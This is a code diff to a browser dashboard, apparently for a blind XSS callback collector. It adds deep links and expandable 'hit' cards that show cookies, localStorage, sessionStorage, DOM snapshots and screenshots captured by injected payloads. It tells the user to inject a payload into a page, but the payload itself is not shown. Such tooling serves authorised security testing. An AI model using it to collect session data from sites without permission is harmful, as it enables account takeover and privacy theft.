+    document.querySelector("#modal-import").addEventListener("click", (event) => {
+      if (event.target === event.currentTarget) closeModal("modal-import");
+    });
+    document.addEventListener("keydown", (event) => {
+      if (event.key === "Escape") closeModal("modal-import");
+    });
 
     async function loadCallbacks() {
       const response = await fetch("/api/callbacks", { cache: "no-store" });
@@ -1286,11 +1857,17 @@ function buildDashboard(baseUrl) {
         location.href = "/login";
         return;
       }
+
       const data = await response.json();
       allCallbacks = data.callbacks || [];
-      renderCallbacks(allCallbacks);
-      updateSuggestions(allCallbacks);
-      refreshEl.textContent = "Last refresh " + new Date().toLocaleTimeString();
+      const signature = signatureOf(allCallbacks);
+      if (signature !== lastSignature) {
+        lastSignature = signature;
+        renderCallbacks(allCallbacks);
+        updateSuggestions(allCallbacks);
+      }
+      refreshEl.textContent = "Updated " + new Date().toLocaleTimeString();
+      handleDeepLink();
     }
 
     async function postJson(url, body) {
@@ -1306,6 +1883,52 @@ function buildDashboard(baseUrl) {
       }
 
       return response.json();
+    }
+
+    function handleDeepLink() {
+      const match = location.hash.match(/^#hit=(.+)$/);
+      if (!match) {
+        return;
+      }
+
+      const slug = match[1];
+      const target = allCallbacks.find((cb) => {
+        const id = (cb.receivedAt || "").replace(/[^a-zA-Z0-9]/g, "-");
+        return id === slug;
+      });
+
+      if (!target) {
+        return;
+      }
+
+      if (isFetchOnly(target) && !showFetch) {
+        showFetch = true;
+        document.querySelector("#show-fetch").checked = true;
+      }
+
+      const key = hitKey(target);
+      activeGroupKey = pageKey(target);
+      expandedHits.add(key);
+      history.replaceState(null, "", location.pathname);
+      renderCallbacks(allCallbacks);
+
+      let card = null;
+      callbacksEl.querySelectorAll(".hit").forEach((el) => {
+        if (el.dataset.key === key) {
+          card = el;
+        }
+      });
+
+      if (card) {
+        card.classList.add("open");
+        const summary = card.querySelector(".hit-summary");
+        if (summary) {
+          summary.setAttribute("aria-expanded", "true");
+        }
+        card.scrollIntoView({ behavior: "smooth", block: "center" });
+        card.style.outline = "2px solid var(--warn)";
+        setTimeout(() => { card.style.outline = ""; }, 1600);
+      }
     }
 
     async function previewImportFile() {
@@ -1387,14 +2010,44 @@ function buildDashboard(baseUrl) {
         userAgent: entry.userAgent || "",
         language: entry.language || "",
         viewport: entry.viewport || "",
+        title: entry.title || "",
+        origin: entry.origin || "",
+        windowName: entry.windowName || "",
+        cookies: entry.cookies || "",
+        localStorage: entry.localStorage || "",
+        sessionStorage: entry.sessionStorage || "",
+        domSnapshot: entry.domSnapshot || "",
+        rawBody: entry.rawBody || "",
         source: entry.source || "import"
       };
     }
 
+    function signatureOf(list) {
+      let hash = 2166136261;
+      const text = list.map((item) => [
+        item.receivedAt || "",
+        item.marker || "",
+        item.source || "",
+        item.cookies ? item.cookies.length : 0,
+        item.domSnapshot ? item.domSnapshot.length : 0
+      ].join("|")).join(";");
+      for (let i = 0; i < text.length; i++) {
+        hash ^= text.charCodeAt(i);
+        hash = Math.imul(hash, 16777619);
+      }
+      return list.length + ":" + (hash >>> 0);
+    }
+
+    function hitKey(item) {
+      return [item.receivedAt || "", item.marker || "", item.ip || "", item.pageUrl || item.referrer || ""].join("|");
+    }
+
     function renderCallbacks(callbacks) {
+      lastSignature = signatureOf(callbacks);
       const filtered = applyFilters(callbacks);
-      const groups = groupCallbacks(filtered);
-      const selected = activeGroupKey && groups.find((group) => group.key === activeGroupKey)
+      const shown = showFetch ? filtered : filtered.filter((item) => !isFetchOnly(item));
+      const groups = groupCallbacks(shown);
+      const selected = activeGroupKey && groups.some((group) => group.key === activeGroupKey)
         ? groups.find((group) => group.key === activeGroupKey)
         : groups[0];
 
@@ -1402,34 +2055,157 @@ function buildDashboard(baseUrl) {
         activeGroupKey = selected.key;
       }
 
-      totalEl.textContent = filtered.length;
-      uniqueEl.textContent = new Set(filtered.map((item) => item.marker).filter(Boolean)).size;
+      totalEl.textContent = shown.length;
+      uniqueEl.textContent = new Set(shown.map((item) => item.marker).filter(Boolean)).size;
+      pagesCountEl.textContent = groups.length;
+      pagesMetaEl.textContent = groups.length + (groups.length === 1 ? " page" : " pages");
+      document.querySelector("#page-copy").hidden = !selected;
+      document.querySelector("#page-delete").hidden = !selected;
       renderGroups(groups, selected && selected.key);
 
-      if (!filtered.length) {
-        detailsTitleEl.textContent = "Hit Details";
-        groupsEl.innerHTML = '<div class="empty">No matching hits.</div>';
-        callbacksEl.innerHTML = '<div class="empty">No callbacks yet. Inject a payload with a unique marker and this table will update.</div>';
+      if (!groups.length) {
+        detailsTitleEl.textContent = "Hits";
+        detailsSubEl.textContent = filtered.length
+          ? "Only fetch-only hits matched — enable Fetch-only to view them."
+          : "No hits yet. Inject a payload to get started.";
+        callbacksEl.innerHTML = '<div class="empty">' + (filtered.length
+          ? "Nothing to show with the current filters."
+          : "No callbacks yet. Copy the payload above and inject it into a page.") + '</div>';
         return;
       }
 
-      const detailHits = selected ? selected.hits : filtered;
-      detailsTitleEl.textContent = selected ? selected.label + " (" + selected.hits.length + " hits)" : "Hit Details";
+      const detailHits = selected ? selected.hits : groups.flatMap((group) => group.hits);
+      detailsTitleEl.textContent = selected ? selected.label : "Hits";
+      detailsSubEl.textContent = detailHits.length + (detailHits.length === 1 ? " hit" : " hits") +
+        (selected ? " on this page" : "");
 
-      const rows = detailHits.map((item) => {
-        const pageDisplay = item.pageUrl || item.referrer || "";
-        const bodyDisplay = item.rawBody ? '<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:120px;overflow-y:auto">' + escapeHtml(item.rawBody) + '</pre>' : '<span class="muted">—</span>';
-        return '<tr>' +
-          '<td><span class="marker">' + escapeHtml(item.marker || "unknown") + '</span><br><span class="muted">' + escapeHtml(formatTime(item.receivedAt)) + '</span></td>' +
-          '<td>' + (pageDisplay ? linkify(pageDisplay) : '<span class="muted">—</span>') + '</td>' +
-          '<td>' + escapeHtml(item.ip || "") + '</td>' +
-          '<td>' + escapeHtml(item.userAgent || "") + '</td>' +
-          '<td>' + escapeHtml(item.viewport || item.source || "") + '<br><span class="muted">' + escapeHtml(item.language || "") + '</span></td>' +
-          '<td>' + bodyDisplay + '</td>' +
-        '</tr>';
-      }).join("");
+      hitIndex = new Map(detailHits.map((item) => [hitKey(item), item]));
+      callbacksEl.innerHTML = detailHits.map(renderHit).join("");
+      callbacksEl.querySelectorAll(".hit").forEach((card) => {
+        const summary = card.querySelector(".hit-summary");
+        if (!summary) {
+          return;
+        }
 
-      callbacksEl.innerHTML = '<table><thead><tr><th style="width: 180px;">Marker</th><th>Page URL</th><th style="width: 130px;">IP</th><th>User Agent</th><th style="width: 120px;">Client</th><th>Body</th></tr></thead><tbody>' + rows + '</tbody></table>';
+        summary.addEventListener("click", (event) => {
+          if (event.target.closest("a")) {
+            return;
+          }
+          toggleHit(card);
+        });
+        summary.addEventListener("keydown", (event) => {
+          if (event.key === "Enter" || event.key === " ") {
+            event.preventDefault();
+            toggleHit(card);
+          }
+        });
+      });
+    }
+
+    function renderHit(item) {
+      const key = hitKey(item);
+      const open = expandedHits.has(key);
+      const fetchOnly = isFetchOnly(item);
+      const sourceLabel = fetchOnly ? "fetch only" : (item.source === "bugatsec-payload" ? "executed" : (item.source || "hit"));
+      const pageDisplay = item.pageUrl || item.referrer || "";
+      const title = item.title || (fetchOnly ? "Payload loaded" : "Untitled page");
+      const detail = open ? renderHitDetail(item) : "";
+
+      return '<article class="hit' + (open ? ' open' : '') + '" data-key="' + escapeAttr(key) + '">' +
+        '<div class="hit-summary" role="button" tabindex="0" aria-expanded="' + (open ? 'true' : 'false') + '">' +
+          '<div class="hit-main">' +
+            '<div class="hit-badges">' +
+              '<span class="marker">' + escapeHtml(item.marker || "unknown") + '</span>' +
+              '<span class="badge ' + (fetchOnly ? 'fetch' : 'exec') + '">' + escapeHtml(sourceLabel) + '</span>' +
+            '</div>' +
+            '<div class="hit-title">' + escapeHtml(title) + '</div>' +
+            '<div class="hit-url">' + (pageDisplay ? linkify(pageDisplay) : '<span class="muted">no page URL</span>') + '</div>' +
+          '</div>' +
+          '<div class="hit-side">' +
+            '<div class="hit-time">' + escapeHtml(formatTime(item.receivedAt)) + '</div>' +
+            (item.ip ? '<div class="hit-ip">' + escapeHtml(item.ip) + '</div>' : '') +
+            '<span class="chevron" aria-hidden="true">▾</span>' +
+          '</div>' +
+        '</div>' +
+        '<div class="hit-detail">' + detail + '</div>' +
+      '</article>';
+    }
+
+    function toggleHit(card) {
+      const key = card.dataset.key;
+      const isOpen = card.classList.toggle("open");
+      const summary = card.querySelector(".hit-summary");
+      if (summary) {
+        summary.setAttribute("aria-expanded", isOpen ? "true" : "false");
+      }
+
+      if (isOpen) {
+        expandedHits.add(key);
+        const detailEl = card.querySelector(".hit-detail");
+        const item = hitIndex.get(key);
+        if (detailEl && !detailEl.innerHTML.trim() && item) {
+          detailEl.innerHTML = renderHitDetail(item);
+        }
+      } else {
+        expandedHits.delete(key);
+      }
+    }
+
+    function renderHitDetail(item) {
+      const parts = [];
+
+      if (item.domSnapshot && item.domSnapshot.startsWith("data:image")) {
+        parts.push('<div class="shot"><img src="' + item.domSnapshot + '" alt="Captured screenshot"></div>');
+      }
+
+      const cards = [];
+      if (item.cookies) {
+        cards.push(detailCard("🍪 Cookies", item.cookies));
+      }
+      if (item.localStorage) {
+        cards.push(detailCard("💾 localStorage", item.localStorage));
+      }
+      if (item.sessionStorage) {
+        cards.push(detailCard(item.source === "payload-load" ? "📋 Request headers" : "💾 sessionStorage", item.sessionStorage));
+      }
+      if (item.rawBody) {
+        cards.push(detailCard("📦 Raw body", item.rawBody));
+      }
+      if (item.domSnapshot && !item.domSnapshot.startsWith("data:image")) {
+        cards.push(detailCard("🌐 DOM snapshot", item.domSnapshot));
+      }
+
+      if (cards.length) {
+        parts.push('<div class="detail-grid">' + cards.join("") + '</div>');
+      }
+
+      const meta = [];
+      if (item.title) meta.push(["Title", item.title]);
+      if (item.pageUrl) meta.push(["Page URL", item.pageUrl]);
+      if (item.referrer) meta.push(["Referrer", item.referrer]);
+      if (item.origin) meta.push(["Origin", item.origin]);
+      if (item.ip) meta.push(["IP", item.ip]);
+      if (item.userAgent) meta.push(["User agent", item.userAgent]);
+      if (item.language) meta.push(["Language", item.language]);
+      if (item.viewport) meta.push(["Viewport", item.viewport]);
+      if (item.windowName) meta.push(["window.name", item.windowName]);
+      if (item.source) meta.push(["Source", item.source]);
+
+      if (meta.length) {
+        parts.push('<details class="meta"><summary>Metadata</summary><dl>' +
+          meta.map((pair) => '<dt>' + escapeHtml(pair[0]) + '</dt><dd>' + escapeHtml(pair[1]) + '</dd>').join("") +
+          '</dl></details>');
+      }
+
+      if (!parts.length) {
+        return '<div class="empty small">No extra data captured for this hit.</div>';
+      }
+
+      return parts.join("");
+    }
+
+    function detailCard(label, value) {
+      return '<div class="detail-card"><h4>' + escapeHtml(label) + '</h4><pre>' + escapeHtml(value) + '</pre></div>';
     }
 
     function applyFilters(callbacks) {
@@ -1475,101 +2251,24 @@ function buildDashboard(baseUrl) {
 
     function renderGroups(groups, selectedKey) {
       if (!groups.length) {
-        groupsEl.innerHTML = '<div class="empty">No matching pages.</div>';
+        groupsEl.innerHTML = '<div class="empty small">No matching pages.</div>';
         return;
       }
 
       groupsEl.innerHTML = groups.map((group) => {
-        return '<div class="group-card' + (group.key === selectedKey ? ' active' : '') + '" data-key="' + escapeAttr(group.key) + '">' +
-          '<button class="group-main" data-action="open" data-key="' + escapeAttr(group.key) + '">' +
+        return '<button class="group-card' + (group.key === selectedKey ? ' active' : '') + '" data-key="' + escapeAttr(group.key) + '" type="button">' +
           '<span class="group-title">' + escapeHtml(group.label) + '</span>' +
-          '<span class="group-meta">Last hit ' + escapeHtml(formatTime(group.lastHit)) + ' &middot; ' +
-          group.uniqueIps + ' IPs &middot; ' + group.uniqueMarkers + ' markers</span></button>' +
-          '<span class="hit-count">' + group.hits.length + ' hits</span>' +
-          '<button class="icon-button ghost" title="Page actions" data-action="menu" data-key="' + escapeAttr(group.key) + '">&vellip;</button>' +
-          '<div class="menu" data-menu="' + escapeAttr(group.key) + '">' +
-          '<button data-action="copy" data-key="' + escapeAttr(group.key) + '">Copy URL</button>' +
-          '<button data-action="cut" data-key="' + escapeAttr(group.key) + '">Cut</button>' +
-          '<button data-action="paste" data-key="' + escapeAttr(group.key) + '"' + (!cutPageKey || cutPageKey === group.key ? ' disabled' : '') + '>Paste here</button>' +
-          '<button class="danger" data-action="delete" data-key="' + escapeAttr(group.key) + '">Delete</button>' +
-          '</div>' +
-        '</div>';
+          '<span class="group-meta">' + group.hits.length + (group.hits.length === 1 ? " hit" : " hits") +
+            ' · ' + group.uniqueIps + ' IP' + (group.uniqueIps === 1 ? "" : "s") +
+            ' · ' + escapeHtml(formatTime(group.lastHit)) + '</span>' +
+        '</button>';
       }).join("");
 
-      groupsEl.querySelectorAll('[data-action="open"]').forEach((button) => {
+      groupsEl.querySelectorAll(".group-card").forEach((button) => {
         button.addEventListener("click", () => {
           activeGroupKey = button.dataset.key;
           renderCallbacks(allCallbacks);
         });
-      });
-      groupsEl.querySelectorAll('[data-action="delete"]').forEach((button) => {
-        button.addEventListener("click", async () => {
-          const pageKey = button.dataset.key;
-          if (!confirm("Delete all hits for this page URL?")) {
-            return;
-          }
-
-          const data = await postJson("/api/callbacks/delete-page", { pageKey });
-          allCallbacks = data.callbacks || [];
-          activeGroupKey = "";
-          renderCallbacks(allCallbacks);
-          updateSuggestions(allCallbacks);
-        });
-      });
-      groupsEl.querySelectorAll('[data-action="menu"]').forEach((button) => {
-        button.addEventListener("click", (event) => {
-          event.stopPropagation();
-          const menu = findPageMenu(button.dataset.key);
-          const shouldOpen = menu && !menu.classList.contains("open");
-          closeMenus();
-          if (shouldOpen) {
-            const buttonRect = button.getBoundingClientRect();
-            menu.classList.toggle("align-up", window.innerHeight - buttonRect.bottom < 180);
-            button.closest(".group-card").classList.add("menu-active");
-            menu.classList.add("open");
-          }
-        });
-      });
-      groupsEl.querySelectorAll('[data-action="copy"]').forEach((button) => {
-        button.addEventListener("click", async () => {
-          await navigator.clipboard.writeText(button.dataset.key);
-          closeMenus();
-        });
-      });
-      groupsEl.querySelectorAll('[data-action="cut"]').forEach((button) => {
-        button.addEventListener("click", () => {
-          cutPageKey = button.dataset.key;
-          closeMenus();
-          renderCallbacks(allCallbacks);
-        });
-      });
-      groupsEl.querySelectorAll('[data-action="paste"]').forEach((button) => {
-        button.addEventListener("click", async () => {
-          if (!cutPageKey || cutPageKey === button.dataset.key) {
-            return;
-          }
-
-          const data = await postJson("/api/callbacks/move-page", {
-            sourcePageKey: cutPageKey,
-            targetPageKey: button.dataset.key
-          });
-          allCallbacks = data.callbacks || [];
-          activeGroupKey = button.dataset.key;
-          cutPageKey = "";
-          closeMenus();
-          renderCallbacks(allCallbacks);
-          updateSuggestions(allCallbacks);
-        });
-      });
-    }
-
-    function closeMenus() {
-      groupsEl.querySelectorAll(".menu.open").forEach((menu) => {
-        menu.classList.remove("open");
-        menu.classList.remove("align-up");
-      });
-      groupsEl.querySelectorAll(".group-card.menu-active").forEach((card) => {
-        card.classList.remove("menu-active");
       });
     }
 
@@ -1588,12 +2287,12 @@ function buildDashboard(baseUrl) {
         .join("");
     }
 
-    function findPageMenu(pageKey) {
-      return Array.from(groupsEl.querySelectorAll("[data-menu]")).find((menu) => menu.dataset.menu === pageKey);
-    }
-
     function pageKey(item) {
       return String(item.pageUrl || item.referrer || "Unknown page");
+    }
+
+    function isFetchOnly(item) {
+      return item.source === "payload-load" || item.source === "image";
     }
 
     function pageLabel(value) {
@@ -1619,7 +2318,7 @@ function buildDashboard(baseUrl) {
       if (!value) return "";
       const safe = escapeHtml(value);
       if (!/^https?:\\/\\//i.test(value)) return safe;
-      return '<a href="' + safe + '" target="_blank" rel="noreferrer" style="color: var(--warn);">' + safe + '</a>';
+      return '<a href="' + safe + '" target="_blank" rel="noreferrer" style="color: var(--blue);">' + safe + '</a>';
     }
 
     function escapeHtml(value) {
